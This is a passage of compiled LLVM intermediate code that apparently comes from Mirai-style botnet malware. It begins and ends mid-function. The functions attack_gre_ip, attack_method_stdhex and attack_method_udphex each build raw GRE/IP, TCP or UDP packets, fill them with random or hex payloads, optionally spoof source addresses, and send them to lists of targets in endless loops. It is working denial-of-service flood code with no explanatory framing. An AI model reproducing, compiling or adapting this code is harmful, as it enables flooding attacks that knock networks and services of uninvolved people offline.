  %48 = call i32 @bind(i32 %43, %struct.sockaddr* nonnull %31, i32 16) #11
  %49 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %50 = load i8, i8* %49, align 4
  %51 = icmp ult i8 %50, 32
  br i1 %51, label %52, label %58

; <label>:52:                                     ; preds = %47
  %53 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %54 = load i32, i32* %53, align 4
  %55 = call i32 @ntohl(i32 %54) #12
  %56 = call i32 @htonl(i32 %55) #12
  %57 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %56, i32* %57, align 4
  br label %58

; <label>:58:                                     ; preds = %52, %47
  %59 = bitcast %struct.attack_target* %41 to %struct.sockaddr*
  %60 = call i32 @connect(i32 %43, %struct.sockaddr* %59, i32 16) #11
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %61 = icmp slt i64 %indvars.iv.next, %32
  br i1 %61, label %35, label %.preheader.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %33, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.loopexit
  %62 = icmp eq i8 %16, 0
  br label %.lr.ph

.lr.ph:                                           ; preds = %67, %.lr.ph.preheader
  %.160 = phi i32 [ %.mux, %67 ], [ 0, %.lr.ph.preheader ]
  %63 = sext i32 %.160 to i64
  %64 = getelementptr inbounds i8*, i8** %8, i64 %63
  %65 = load i8*, i8** %64, align 8
  br i1 %62, label %67, label %66

; <label>:66:                                     ; preds = %.lr.ph
  call void @rand_str(i8* %65, i32 %.mask)
  br label %67

; <label>:67:                                     ; preds = %.lr.ph, %66
  %68 = getelementptr inbounds i32, i32* %10, i64 %63
  %69 = load i32, i32* %68, align 4
  %70 = call i64 @send(i32 %69, i8* %65, i64 %34, i32 16384) #11
  %71 = add nsw i32 %.160, 1
  %72 = icmp slt i32 %71, %24
  %.mux = select i1 %72, i32 %71, i32 0
  br label %.lr.ph
}

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #11
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %23 = trunc i32 %22 to i8
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 19, i32 0)
  %25 = trunc i32 %24 to i8
  %26 = load i32, i32* @LOCAL_ADDR, align 4
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %26)
  %28 = tail call i32 @socket(i32 2, i32 3, i32 6) #11
  %29 = icmp eq i32 %28, -1
  br i1 %29, label %183, label %30

; <label>:30:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %31 = bitcast i32* %5 to i8*
  %32 = call i32 @setsockopt(i32 %28, i32 0, i32 3, i8* nonnull %31, i32 4) #11
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %45, label %.preheader125

.preheader125:                                    ; preds = %30
  store i32 0, i32* %5, align 4
  %34 = zext i8 %0 to i32
  %35 = icmp eq i8 %0, 0
  %.pre129 = sext i32 %21 to i64
  %.pre130 = add nsw i64 %.pre129, 52
  br i1 %35, label %.preheader, label %.lr.ph127

.lr.ph127:                                        ; preds = %.preheader125
  %36 = trunc i64 %.pre130 to i16
  %37 = icmp ne i8 %16, 0
  %38 = add nsw i64 %.pre129, 28
  %39 = trunc i64 %38 to i16
  %40 = xor i16 %12, -1
  %41 = icmp eq i8 %25, 0
  %42 = add nsw i64 %.pre129, 8
  %43 = trunc i64 %42 to i16
  %44 = zext i8 %0 to i64
  br label %58

; <label>:45:                                     ; preds = %30
  %46 = call i32 @close(i32 %28) #11
  br label %183

..preheader_crit_edge:                            ; preds = %98
  %47 = trunc i64 %indvars.iv.next to i32
  store i32 %47, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader125, %..preheader_crit_edge
  %48 = icmp eq i32 %27, -1
  %49 = and i32 %11, 65535
  %50 = icmp eq i32 %49, 65535
  %51 = and i32 %17, 65535
  %52 = icmp eq i32 %51, 65535
  %53 = and i32 %19, 65535
  %54 = icmp eq i32 %53, 65535
  %55 = icmp eq i8 %25, 0
  %56 = icmp eq i8 %23, 0
  %57 = add i32 %21, 8
  br label %.loopexit

; <label>:58:                                     ; preds = %.lr.ph127, %98
  %indvars.iv = phi i64 [ 0, %.lr.ph127 ], [ %indvars.iv.next, %98 ]
  %59 = call noalias i8* @calloc(i64 1510, i64 8) #11
  %60 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %59, i8** %60, align 8
  %61 = getelementptr inbounds i8, i8* %59, i64 24
  %62 = getelementptr inbounds i8, i8* %59, i64 44
  store i8 69, i8* %59, align 4
  %63 = getelementptr inbounds i8, i8* %59, i64 1
  store i8 %10, i8* %63, align 1
  %64 = call zeroext i16 @htons(i16 zeroext %36) #12
  %65 = getelementptr inbounds i8, i8* %59, i64 2
  %66 = bitcast i8* %65 to i16*
  store i16 %64, i16* %66, align 2
  %67 = call zeroext i16 @htons(i16 zeroext %12) #12
  %68 = getelementptr inbounds i8, i8* %59, i64 4
  %69 = bitcast i8* %68 to i16*
  store i16 %67, i16* %69, align 4
  %70 = getelementptr inbounds i8, i8* %59, i64 8
  store i8 %14, i8* %70, align 4
  br i1 %37, label %71, label %75

; <label>:71:                                     ; preds = %58
  %72 = call zeroext i16 @htons(i16 zeroext 16384) #12
  %73 = getelementptr inbounds i8, i8* %59, i64 6
  %74 = bitcast i8* %73 to i16*
  store i16 %72, i16* %74, align 2
  br label %75

; <label>:75:                                     ; preds = %71, %58
  %76 = getelementptr inbounds i8, i8* %59, i64 9
  store i8 47, i8* %76, align 1
  %77 = getelementptr inbounds i8, i8* %59, i64 12
  %78 = bitcast i8* %77 to i32*
  store i32 %27, i32* %78, align 4
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %80 = load i32, i32* %79, align 4
  %81 = getelementptr inbounds i8, i8* %59, i64 16
  %82 = bitcast i8* %81 to i32*
  store i32 %80, i32* %82, align 4
  %83 = call zeroext i16 @htons(i16 zeroext 2048) #12
  %84 = getelementptr inbounds i8, i8* %59, i64 22
  %85 = bitcast i8* %84 to i16*
  store i16 %83, i16* %85, align 2
  store i8 69, i8* %61, align 4
  %86 = getelementptr inbounds i8, i8* %59, i64 25
  store i8 %10, i8* %86, align 1
  %87 = call zeroext i16 @htons(i16 zeroext %39) #12
  %88 = getelementptr inbounds i8, i8* %59, i64 26
  %89 = bitcast i8* %88 to i16*
  store i16 %87, i16* %89, align 2
  %90 = call zeroext i16 @htons(i16 zeroext %40) #12
  %91 = getelementptr inbounds i8, i8* %59, i64 28
  %92 = bitcast i8* %91 to i16*
  store i16 %90, i16* %92, align 4
  %93 = getelementptr inbounds i8, i8* %59, i64 32
  store i8 %14, i8* %93, align 4
  br i1 %37, label %94, label %98

; <label>:94:                                     ; preds = %75
  %95 = call zeroext i16 @htons(i16 zeroext 16384) #12
  %96 = getelementptr inbounds i8, i8* %59, i64 30
  %97 = bitcast i8* %96 to i16*
  store i16 %95, i16* %97, align 2
  br label %98

; <label>:98:                                     ; preds = %94, %75
  %99 = getelementptr inbounds i8, i8* %59, i64 33
  store i8 17, i8* %99, align 1
  %. = select i1 %41, i32 1023, i32 %80
  %100 = getelementptr inbounds i8, i8* %59, i64 40
  %101 = bitcast i8* %100 to i32*
  store i32 %., i32* %101, align 4
  %102 = call zeroext i16 @htons(i16 zeroext %18) #12
  %103 = bitcast i8* %62 to i16*
  store i16 %102, i16* %103, align 2
  %104 = call zeroext i16 @htons(i16 zeroext %20) #12
  %105 = getelementptr inbounds i8, i8* %59, i64 46
  %106 = bitcast i8* %105 to i16*
  store i16 %104, i16* %106, align 2
  %107 = call zeroext i16 @htons(i16 zeroext %43) #12
  %108 = getelementptr inbounds i8, i8* %59, i64 48
  %109 = bitcast i8* %108 to i16*
  store i16 %107, i16* %109, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %110 = icmp slt i64 %indvars.iv.next, %44
  br i1 %110, label %58, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %154
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %35, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %154
  %storemerge124126 = phi i32 [ %181, %154 ], [ 0, %.lr.ph.preheader ]
  %111 = sext i32 %storemerge124126 to i64
  %112 = getelementptr inbounds i8*, i8** %8, i64 %111
  %113 = load i8*, i8** %112, align 8
  %114 = getelementptr inbounds i8, i8* %113, i64 24
  %115 = bitcast i8* %114 to %struct.iphdr*
  %116 = getelementptr inbounds i8, i8* %113, i64 44
  %117 = getelementptr inbounds i8, i8* %113, i64 52
  %118 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %111, i32 2
  %119 = load i8, i8* %118, align 4
  %120 = icmp ult i8 %119, 32
  br i1 %120, label %121, label %128

; <label>:121:                                    ; preds = %.lr.ph
  %122 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %111, i32 1
  %123 = load i32, i32* %122, align 4
  %124 = call i32 @ntohl(i32 %123) #12
  %125 = call i32 @htonl(i32 %124) #12
  %126 = getelementptr inbounds i8, i8* %113, i64 16
  %127 = bitcast i8* %126 to i32*
  store i32 %125, i32* %127, align 4
  br label %128

; <label>:128:                                    ; preds = %121, %.lr.ph
  br i1 %48, label %129, label %132

; <label>:129:                                    ; preds = %128
  %130 = getelementptr inbounds i8, i8* %113, i64 12
  %131 = bitcast i8* %130 to i32*
  store i32 0, i32* %131, align 4
  br label %132

; <label>:132:                                    ; preds = %129, %128
  br i1 %50, label %133, label %138

; <label>:133:                                    ; preds = %132
  %134 = getelementptr inbounds i8, i8* %113, i64 4
  %135 = bitcast i8* %134 to i16*
  store i16 0, i16* %135, align 4
  %136 = getelementptr inbounds i8, i8* %113, i64 28
  %137 = bitcast i8* %136 to i16*
  store i16 999, i16* %137, align 4
  br label %138

; <label>:138:                                    ; preds = %133, %132
  br i1 %52, label %139, label %141

; <label>:139:                                    ; preds = %138
  %140 = bitcast i8* %116 to i16*
  store i16 0, i16* %140, align 2
  br label %141

; <label>:141:                                    ; preds = %139, %138
  br i1 %54, label %142, label %145

; <label>:142:                                    ; preds = %141
  %143 = getelementptr inbounds i8, i8* %113, i64 46
  %144 = bitcast i8* %143 to i16*
  store i16 0, i16* %144, align 2
  br label %145

; <label>:145:                                    ; preds = %142, %141
  br i1 %55, label %150, label %146

; <label>:146:                                    ; preds = %145
  %147 = getelementptr inbounds i8, i8* %113, i64 16
  %148 = bitcast i8* %147 to i32*
  %149 = load i32, i32* %148, align 4
  br label %150

; <label>:150:                                    ; preds = %145, %146
  %.sink3 = phi i32 [ %149, %146 ], [ 0, %145 ]
  %151 = getelementptr inbounds i8, i8* %113, i64 40
  %152 = bitcast i8* %151 to i32*
  store i32 %.sink3, i32* %152, align 4
  br i1 %56, label %154, label %153

; <label>:153:                                    ; preds = %150
  call void @rand_str(i8* nonnull %117, i32 %21)
  %.pre = load i32, i32* %5, align 4
  br label %154

; <label>:154:                                    ; preds = %150, %153
  %155 = phi i32 [ %storemerge124126, %150 ], [ %.pre, %153 ]
  %156 = getelementptr inbounds i8, i8* %113, i64 10
  %157 = bitcast i8* %156 to i16*
  store i16 0, i16* %157, align 2
  %158 = bitcast i8* %113 to i16*
  %159 = call zeroext i16 @checksum_generic(i16* %158, i32 20)
  store i16 %159, i16* %157, align 2
  %160 = getelementptr inbounds i8, i8* %113, i64 34
  %161 = bitcast i8* %160 to i16*
  store i16 0, i16* %161, align 2
  %162 = bitcast i8* %114 to i16*
  %163 = call zeroext i16 @checksum_generic(i16* %162, i32 20)
  store i16 %163, i16* %161, align 2
  %164 = getelementptr inbounds i8, i8* %113, i64 50
  %165 = bitcast i8* %164 to i16*
  store i16 0, i16* %165, align 2
  %166 = getelementptr inbounds i8, i8* %113, i64 48
  %167 = bitcast i8* %166 to i16*
  %168 = load i16, i16* %167, align 2
  %169 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %115, i8* nonnull %116, i16 zeroext %168, i32 %57)
  store i16 %169, i16* %165, align 2
  %170 = sext i32 %155 to i64
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 0, i32 0
  store i16 2, i16* %171, align 4
  %172 = getelementptr inbounds i8, i8* %113, i64 16
  %173 = bitcast i8* %172 to i32*
  %174 = load i32, i32* %173, align 4
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 0, i32 2, i32 0
  store i32 %174, i32* %175, align 4
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 0, i32 1
  store i16 0, i16* %176, align 2
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 0
  %178 = bitcast %struct.sockaddr_in* %177 to %struct.sockaddr*
  %179 = call i64 @sendto(i32 %28, i8* nonnull %113, i64 %.pre130, i32 16384, %struct.sockaddr* %178, i32 16) #11
  %180 = load i32, i32* %5, align 4
  %181 = add nsw i32 %180, 1
  store i32 %181, i32* %5, align 4
  %182 = icmp slt i32 %181, %34
  br i1 %182, label %.lr.ph, label %.loopexit.loopexit

; <label>:183:                                    ; preds = %4, %45
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_stdhex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #11
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #11
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1294)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #12
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.061 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %._crit_edge, label %.lr.ph65

.lr.ph65:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br label %33

; <label>:33:                                     ; preds = %.lr.ph65, %56
  %indvars.iv = phi i64 [ 0, %.lr.ph65 ], [ %indvars.iv.next, %56 ]
  %34 = call noalias i8* @calloc(i64 65535, i64 1) #11
  %35 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %34, i8** %35, align 8
  br i1 %27, label %38, label %36

; <label>:36:                                     ; preds = %33
  %37 = call zeroext i16 @htons(i16 zeroext %12) #12
  br label %38

; <label>:38:                                     ; preds = %33, %36
  %.sink = phi i16 [ %37, %36 ], [ 0, %33 ]
  %39 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %40 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 %.sink, i16* %40, align 2
  %41 = call i32 @socket(i32 2, i32 2, i32 0) #11
  %42 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %41, i32* %42, align 4
  %43 = icmp eq i32 %41, -1
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %38
  ret void

; <label>:45:                                     ; preds = %38
  store i16 2, i16* %28, align 4
  store i16 %.061, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %46 = call i32 @bind(i32 %41, %struct.sockaddr* nonnull %31, i32 16) #11
  %47 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %48 = load i8, i8* %47, align 4
  %49 = icmp ult i8 %48, 32
  br i1 %49, label %50, label %56

; <label>:50:                                     ; preds = %45
  %51 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %52 = load i32, i32* %51, align 4
  %53 = call i32 @ntohl(i32 %52) #12
  %54 = call i32 @htonl(i32 %53) #12
  %55 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %54, i32* %55, align 4
  br label %56

; <label>:56:                                     ; preds = %50, %45
  %57 = bitcast %struct.attack_target* %39 to %struct.sockaddr*
  %58 = call i32 @connect(i32 %41, %struct.sockaddr* %57, i32 16) #11
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %59 = icmp slt i64 %indvars.iv.next, %32
  br i1 %59, label %33, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %56
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %23
  %60 = load i8*, i8** @hexPayload, align 8
  %61 = call i64 @strlen(i8* %60) #14
  %62 = icmp eq i8 %0, 0
  %.mask = and i32 %14, 65535
  %sext = shl i64 %61, 32
  %63 = ashr exact i64 %sext, 32
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit, %._crit_edge
  br i1 %62, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.loopexit
  %64 = icmp eq i8 %16, 0
  %65 = zext i32 %.mask to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %70, %.lr.ph.preheader
  %.163 = phi i32 [ %.mux, %70 ], [ 0, %.lr.ph.preheader ]
  %66 = sext i32 %.163 to i64
  %67 = getelementptr inbounds i8*, i8** %8, i64 %66
  %68 = load i8*, i8** %67, align 8
  br i1 %64, label %70, label %69

; <label>:69:                                     ; preds = %.lr.ph
  call void @rand_str(i8* %68, i32 %.mask)
  br label %70

; <label>:70:                                     ; preds = %.lr.ph, %69
  %71 = getelementptr inbounds i32, i32* %10, i64 %66
  %72 = load i32, i32* %71, align 4
  %73 = call i64 @send(i32 %72, i8* %68, i64 %65, i32 16384) #11
  %74 = load i8*, i8** @hexPayload, align 8
  %75 = call i64 @send(i32 %72, i8* %74, i64 %63, i32 16384) #11
  %76 = add nsw i32 %.163, 1
  %77 = icmp slt i32 %76, %24
  %.mux = select i1 %77, i32 %76, i32 0
  br label %.lr.ph
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udphex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #11
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #11
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1294)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #12
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.056 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %.preheader, label %.lr.ph60

.lr.ph60:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br label %35

.preheader.loopexit:                              ; preds = %58
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %23
  %33 = icmp eq i8 %0, 0
  %34 = icmp eq i8 %16, 0
  br label %.loopexit

; <label>:35:                                     ; preds = %.lr.ph60, %58
  %indvars.iv = phi i64 [ 0, %.lr.ph60 ], [ %indvars.iv.next, %58 ]
  %36 = call noalias i8* @calloc(i64 65535, i64 1) #11
  %37 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %36, i8** %37, align 8
  br i1 %27, label %40, label %38

; <label>:38:                                     ; preds = %35
  %39 = call zeroext i16 @htons(i16 zeroext %12) #12
  br label %40

; <label>:40:                                     ; preds = %35, %38
  %.sink = phi i16 [ %39, %38 ], [ 0, %35 ]
  %41 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %42 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 %.sink, i16* %42, align 2
  %43 = call i32 @socket(i32 2, i32 2, i32 17) #11
  %44 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %43, i32* %44, align 4
  %45 = icmp eq i32 %43, -1
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %40
  ret void

; <label>:47:                                     ; preds = %40
  store i16 2, i16* %28, align 4
  store i16 %.056, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %48 = call i32 @bind(i32 %43, %struct.sockaddr* nonnull %31, i32 16) #11
  %49 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %50 = load i8, i8* %49, align 4
  %51 = icmp ult i8 %50, 32
  br i1 %51, label %52, label %58

; <label>:52:                                     ; preds = %47
  %53 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %54 = load i32, i32* %53, align 4
  %55 = call i32 @ntohl(i32 %54) #12
  %56 = call i32 @htonl(i32 %55) #12
  %57 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %56, i32* %57, align 4
  br label %58

; <label>:58:                                     ; preds = %52, %47
  %59 = bitcast %struct.attack_target* %41 to %struct.sockaddr*
  %60 = call i32 @connect(i32 %43, %struct.sockaddr* %59, i32 16) #11
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %61 = icmp slt i64 %indvars.iv.next, %32
  br i1 %61, label %35, label %.preheader.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %33, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.loopexit
  %62 = and i32 %14, 65535
  br label %.lr.ph

.lr.ph:                                           ; preds = %67, %.lr.ph.preheader
  %.158 = phi i32 [ %.mux, %67 ], [ 0, %.lr.ph.preheader ]
  %63 = sext i32 %.158 to i64
  br i1 %34, label %67, label %64

; <label>:64:                                     ; preds = %.lr.ph
  %65 = getelementptr inbounds i8*, i8** %8, i64 %63
  %66 = load i8*, i8** %65, align 8
  call void @rand_str(i8* %66, i32 %62)
  br label %67

; <label>:67:                                     ; preds = %.lr.ph, %64
  %68 = getelementptr inbounds i32, i32* %10, i64 %63
  %69 = load i32, i32* %68, align 4
  %70 = call i64 @send(i32 %69, i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str, i64 0, i64 0), i64 1458, i32 16384) #11
  %71 = add nsw i32 %.158, 1
  %72 = icmp slt i32 %71, %24
  %.mux = select i1 %72, i32 %71, i32 0
  br label %.lr.ph
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @checksum_generic(i16* nocapture readonly, i32) local_unnamed_addr #5 {
  %3 = icmp ugt i32 %1, 1
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %addconv27 = add nuw i32 %5, 1
  %min.iters.check = icmp ult i32 %addconv27, 4
  br i1 %min.iters.check, label %.lr.ph.preheader28, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph.preheader
  %8 = zext i32 %addconv27 to i64
  %9 = and i32 %addconv27, 3
  %n.mod.vf = zext i32 %9 to i64
  %n.vec = sub nsw i64 %8, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %10 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %1, %10
  %ind.end21 = getelementptr i16, i16* %0, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph.preheader28, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <2 x i64> [ %16, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi22 = phi <2 x i64> [ %17, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %0, i64 %index
  %11 = bitcast i16* %next.gep to <2 x i16>*
  %wide.load = load <2 x i16>, <2 x i16>* %11, align 2
  %12 = getelementptr i16, i16* %next.gep, i64 2
  %13 = bitcast i16* %12 to <2 x i16>*
  %wide.load25 = load <2 x i16>, <2 x i16>* %13, align 2
  %14 = zext <2 x i16> %wide.load to <2 x i64>
  %15 = zext <2 x i16> %wide.load25 to <2 x i64>
  %16 = add <2 x i64> %14, %vec.phi
  %17 = add <2 x i64> %15, %vec.phi22
  %index.next = add i64 %index, 4
  %18 = icmp eq i64 %index.next, %n.vec
  br i1 %18, label %middle.block, label %vector.body, !llvm.loop !1

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <2 x i64> %17, %16
  %rdx.shuf = shufflevector <2 x i64> %bin.rdx, <2 x i64> undef, <2 x i32> <i32 1, i32 undef>
  %bin.rdx26 = add <2 x i64> %bin.rdx, %rdx.shuf
  %19 = extractelement <2 x i64> %bin.rdx26, i32 0
  %cmp.n = icmp eq i32 %9, 0
  br i1 %cmp.n, label %._crit_edge.loopexit, label %.lr.ph.preheader28

.lr.ph.preheader28:                               ; preds = %middle.block, %min.iters.checked, %.lr.ph.preheader
